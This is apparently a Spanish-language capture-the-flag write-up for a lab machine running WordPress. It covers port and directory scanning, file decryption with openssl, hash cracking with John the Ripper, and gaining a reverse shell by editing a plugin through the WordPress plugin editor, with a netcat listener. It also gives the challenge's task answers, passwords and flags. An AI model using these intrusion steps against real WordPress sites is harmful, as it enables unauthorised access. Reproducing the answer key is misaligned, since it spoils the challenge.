...
```bash
sudo nmap -vv -sT -sV 10.10.xxx.xx -p-
```
...
Scanning 10.10.xxx.xx [65535 ports]
Discovered open port 22/tcp on 10.10.xxx.xx
Discovered open port 4444/tcp on 10.10.xxx.xx
Discovered open port 5353/tcp on 10.10.xxx.xx
...
```bash
┌──(kali㉿0xSohaib)-[~]
└─$ sudo nmap -sS -sU -sV -p 4444,5353 --script="default,vuln,exploit,auth,brute" -O --fuzzy 10.10.xxx.xx
...
```bash
┌─(kali㉿0xSohaib)-[~]
└─$ gobuster dir -u http://10.10.xxx.xx:4444 -w /usr/share/wordlists/dirb/common.txt
===============================================================
Gobuster v3.8
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:                     http://10.10.xxx.xx:4444
[+] Method:                  GET
[+] Threads:                 10
...
===============================================================
/index.php            (Status: 301) [Size: 0] [--> http://10.10.xxx.xx:4444/]
/info.php             (Status: 200) [Size: 73856]
/wp-admin             (Status: 403) [Size: 345]
/wp-content           (Status: 301) [Size: 0] [--> http://10.10.xxx.xx:4444/wp-content/]
/wp-includes          (Status: 301) [Size: 0] [--> http://10.10.xxx.xx:4444/wp-includes/]
...
┌──(kali㉿0xSohaib)-[~]
└─$ gobuster dir -u http://10.10.xxx.xx:4444 -w /usr/share/wordlists/dirb/big.txt   
===============================================================
Gobuster v3.8
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
...
```bash
┌──(kali㉿0xSohaib)-[~]
└─$ gobuster dir -u http://10.10.xxx.xx:4444 -w '/home/kali/Desktop/wp.txt'                                 
===============================================================
Gobuster v3.8
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
...
[Resultados omitidos ...]
/wp-includes/theme-compat (Status: 301) [Size: 0] [--> http://10.10.xxx.xx:4444/wp-includes/theme-compat/]
/wp-includes/widgets  (Status: 301) [Size: 0] [--> http://10.10.xxx.xx:4444/wp-includes/widgets/]
...
Pasamos a la siguiente tarea del reto. En la task 4 nos aparece una alerta en formato hexadecimal.

![alt text](image-14.png)

Quitando el delimitador `0x`, nos da una frase codificada en `base64`. El contenido de la frase es **Wait a moment**.

![alt text](image-19.png)

Al esperar, la página vuelve a mostrar otra alerta con un enlace:

![alt text](image-18.png)

El archivo `3n1fm4.zip` contiene wp_pass. Según el acertijo, hace referencia la flor japonesa de Camellia - 192, con iteración 1001. 

**Task 4:** 
>**¿Qué Flag nos ha dado la trituradora?** 
admin

>**¿Cuál es el error?** 
0x560x320x460x4a0x640x430x420x420x490x470x310x500x620x550x560x750x560x410x3d0x3d

>**¿Qué comando has usado para descifrar la poesía?** 
openssl -camellia-192-cbc  -pbkdf2 -iter 1001 -d -in wp_pass -out wp_pass.txt

>**¿Qué contraseña has obtenido?** 
1FItkRieW!km@v7fI3

Una vez finalizada la tarea 4, la web nos redirige a la siguiente tarea. La redirección nos mueve al puerto `5353` al apartado de Login de wordpress `wp-login.php`.

Mediante el usuario `admin` y contraseña `1FItkRieW!km@v7fI3` podemos acceder al dashboard del wordpress de Dr. Cifrado.

Una vez que carga el dashboard, disponemos de `5` experimentos. Nos vamos a centrar en el experimento **No W0rks**.
...
>**¿Cuántos experimentos hay?** 
5

>**¿Si sumamos todas las versiones de los experimentos que obtenemos** 
13.3.0

Al activar **No W0rks**, nos descarga un archivo desde Google Drive: **internal_pass.txt**. El contenido del documento es el siguiente hash:

```bash
0f12bf3da1115996a6eadd5f5aa318c11bd72d38bef6d042e4c7e6b44920ff69
```
Mediante `John the Ripper` y el diccionario **940f.txt** podemos crackear el hash:

```bash
┌──(kali㉿0xSohaib)-[~/Desktop/passkeys]
└─$ john --format=raw-sha256 --wordlist=940f.txt internal_pass.txt
Using default input encoding: UTF-8
...
Press 'q' or Ctrl-C to abort, almost any other key for status
bwcc2009new      (?)     
1g 0:00:00:00 DONE (2025-11-17 06:46) 100.0g/s 1806Kp/s 1806Kc/s 1806KC/s s3cr3t.zip..d+
Use the "--show --format=Raw-SHA256" options to display all of the cracked passwords reliably
Session completed. 
```

>**¿Qué contraseña necesitamos para avanzar?** 
bwcc2009new

Esta contraseña nos sirve para poder acceder a la webshell **Demeter**, pero como alternativa, podemos abrir una reverse shell mediante el editor de plugins de wordpress.

---

## 4. Explotación

#### Reverse shell mediante editor de plugins

Se realiza una prueba rápida a las URL que Wordpress usa por defecto y se descubre que `hxxp://drcifrado[.]bs:5353/wp-admin/plugin-editor.php` se ecnuentra accesible y sin restricción.

![alt text](image-21.png)

Seleccionamos uno de los plugins para editar, el mas sencillo es **No W0rks**.

![alt text](image-22.png)

Ahora en el editor podemos insertar nuestra reverse shell aprovechando la misma función que usa el plugin para descargar el archivo **_\_FILE__**.
...
define('REVERSE_SHELL_IP', '10.21.xxx.xxx');
...
```
Una vez actualizado el código del plugin, ya se puede activar para que se cominique con nuestro netcat (previamente iniciado en modo escucha mediante el comando  `nc -lnvp 4666`).

![alt text](reverse.gif)

Ya estando dentro, se procede a explorar el entorno para recopilar mas información sobre la máquina.

```bash
┌──(kali㉿0xSohaib)-[~]
└─$ nc -lnvp 4666
listening on [any] 4666 ...
connect to [10.21.225.157] from (UNKNOWN) [10.10.55.173] 37584
bash: cannot set terminal process group (566): Inappropriate ioctl for device
bash: no job control in this shell
www-data@2d3288bfa2ad:/var/www/wp-admin$ pwd
pwd
/var/www/wp-admin
www-data@2d3288bfa2ad:/var/www/wp-admin$ whoami
whoami
www-data
www-data@2d3288bfa2ad:/var/www/wp-admin$ uname -a
uname -a
Linux 2d3288bfa2ad 5.4.0-215-generic #235-Ubuntu SMP Fri Apr 11 21:55:32 UTC 2025 x86_64 x86_64 x86_64 GNU/Linux                             
www-data@2d3288bfa2ad:/var/www/wp-admin$                                                                                       
```

**Task 5:** 
>**¿A que carpeta has aterrizado?** 
/var/www/wp-admin

>**¿Qué usuario eres?** 
www-data

>**¿Que Kernel tiene la máquina?** 
Linux 2d3288bfa2ad 5.4.0-215-generic #235-Ubuntu SMP Fri Apr 11 21:55:32 UTC 2025 x86_64 x86_64 x86_64 GNU/Linux

---
#### Después de pasar varias horas explorando la máquina, llego a las siguiente conclusion:

- El servidor se encuentra corriendo en un entorno docker, en un contenedor hermético que a primera vista no permite ni escalada de privilegios ni escape hacia el host real.

```bash
www-data@2d3288bfa2ad:/var/www/wp-admin$ cat /proc/self/status | grep  Cap
Cap
Inh: 
0000000000000000
CapPrm:
...
```
```bash                                                                             
www-data@2d3288bfa2ad:/var/www/wp-admin$ cat /proc/self/status | grep "CapEff"
